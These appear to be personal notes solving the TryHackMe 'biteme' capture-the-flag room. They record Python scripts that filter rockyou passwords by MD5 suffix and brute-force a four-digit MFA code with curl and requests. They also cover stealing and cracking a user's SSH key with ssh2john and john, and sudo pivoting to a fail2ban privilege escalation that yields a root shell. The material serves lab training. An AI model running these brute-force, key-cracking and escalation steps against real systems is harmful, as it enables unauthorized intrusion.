[https://tryhackme.com/room/biteme](https://tryhackme.com/room/biteme)
 
22  
80
 
80 ubuntu default page
 
dirbuster  
/console/login.php
 
curl -L $ip/console  
document|getElementById|clicked|value|yes|console|log|fred|I|turned|on|php|file|syntax|highlighting|for|you|to|review|jason
 
Google search php file syntax highlighting:  
Try …/login.phps
 
See php souce code, see login function  
See other files at top, go to config.phps and functions.phps
 
Username: 6a61736f6e5f746573745f6163636f756e74  
See the function uses bin2hex, so find online hex2bin and find username:  
jason_test_account
 
Password hashes the given pwd with md5 then sees if last three are 001  
Write python script to find rockyou pwds that match:
 
import hashlib
 
with open("rockyou.txt", "r") as rock:  
r = rock.readlines()  
for i in r:  
i = bytes(i, 'utf-8')  
md5 = hashlib.md5()  
md5.update(i)  
new = md5.hexdigest()  
if new[-3:] == "001":  
print("{} will work with {}".format(i, new))  
else:  
continue
   

Password: violet
 
jason_test_account:violet
 
[http://10.10.89.148/console/mfa.php](http://10.10.89.148/console/mfa.php)
   

Write script to try all four digit numbers as codes:
 
import os
 
nums = range(1000, 9999)
 
for num in nums:  
os.system("curl -X POST -d 'code={}' -b 'PHPSESSID=g296gr75gmkkjcq719i6asbgfi; user=jason_test_account; pwd=violet' [http://10.10.89.148/console/mfa.php](http://10.10.89.148/console/mfa.php) -o output.txt".format(num))
 
with open("output.txt") as op:  
o = op.read()  
if "Incorrect" not in o:  
print("***************** THE NUMBER IS : {} ***************** ".format(num))  
os.system("echo '***************** THE NUMBER IS : {} ***************** ' >> code.txt".format(num))  
break  
else:  
continue
 
os.system("echo 'NUMBER: {}'".format(num))
   

CODE: 2824
 
Find user/jason/user.txt flag  
Get /user/jason/.ssh/id_rsa
 
Chmod 600 id_rsa  
Ssh -I id_rsa jason@ip
 
Need passphrase for ssh key
 
Ssh2john id_rsa > john.txt
 
John --format="ssh" --wordlist="rockyou.txt" john.txt
 
>> 1a2b3c4d
 
Sudo -l  
Sudo -u fred bash  
Sudo -l
 
Lookup fail2ban privilege escalation, follow directions
 
./tmp/bash -p

TEST:
 
import requests as r
 
nums = range(999, 9999)  
url = "[http://10.10.89.148/console/mfa.php](http://10.10.89.148/console/mfa.php)"  
cookie = {"PHPSESSID":"g296gr75gmkkjcq719i6asbgfi","user":"jason_test_account","pwd":"violet"}
 
"PHPSESSID=g296gr75gmkkjcq719i6asbgfi; user=jason_test_account; pwd=violet"
 
for num in nums:  
obj = {"body": "code={}".format(num), "PHPSESSID":"g296gr75gmkkjcq719i6asbgfi","user":"jason_test_account","pwd":"violet"}
 
x = r.post(url, data = obj)
 
res = x.text
 
print(res)
 
if "Incorrect code" not in res:  
print(num)  
else:  
continue